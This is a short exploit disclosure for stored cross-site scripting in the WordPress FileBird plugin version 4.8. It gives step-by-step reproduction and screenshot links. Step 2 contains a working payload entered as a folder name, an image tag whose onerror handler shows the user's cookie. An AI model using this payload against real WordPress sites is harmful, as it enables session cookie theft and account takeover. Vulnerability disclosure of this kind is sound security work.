# Exploit Title: WordPress FileBird plugin cross-site scripting vulnerabilities
# Exploit Author: Thinkland Security Team
# Vendor Homepage: https://wordpress.org/plugins/filebird/
# Version :  V4.8
# Vulnerability Type: Cross-site Scripting
# Tested on Windows 10 、XAMPP
# Vulnerability proof：  
1. Click New Folder 
![image](https://github.com/BigTiger2020/word-press/blob/main/xss-1.png)  
2. Folder name input:"><img src=1 onerror=alert(document.cookie)>,click save
![image](https://github.com/BigTiger2020/word-press/blob/main/xss-2.png)  
3.The cookie identity information pops up successfully  
![image](https://github.com/BigTiger2020/word-press/blob/main/xss-3.png)  
![image](https://github.com/BigTiger2020/word-press/blob/main/%E6%9C%AA%E5%91%BD%E5%90%8D-%E5%89%AF%E6%9C%AC(4).gif)



